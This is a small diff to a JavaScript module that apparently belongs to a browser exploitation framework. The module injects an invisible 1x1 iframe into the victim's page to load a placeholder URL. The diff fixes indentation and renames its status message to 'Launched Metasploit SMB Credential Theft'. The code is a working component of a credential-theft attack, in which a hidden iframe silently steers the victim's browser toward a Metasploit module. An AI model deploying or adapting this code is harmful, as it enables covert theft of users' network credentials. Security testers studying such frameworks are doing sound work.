@@ -4,11 +4,11 @@ function do_main(){
 	var iframe = document.createElement('iframe');
 	iframe.src = 'URL';
 	iframe.setAttribute("width", "1");
-  iframe.setAttribute("height", "1");
+  	iframe.setAttribute("height", "1");
 	iframe.setAttribute("style", "visibility:hidden;");
 	document.body.appendChild(iframe);
 
-	return "Launched Metasploit Module";
+	return "Launched Metasploit SMB Credential Theft";
 }
 
 return_result(result_id, do_main());
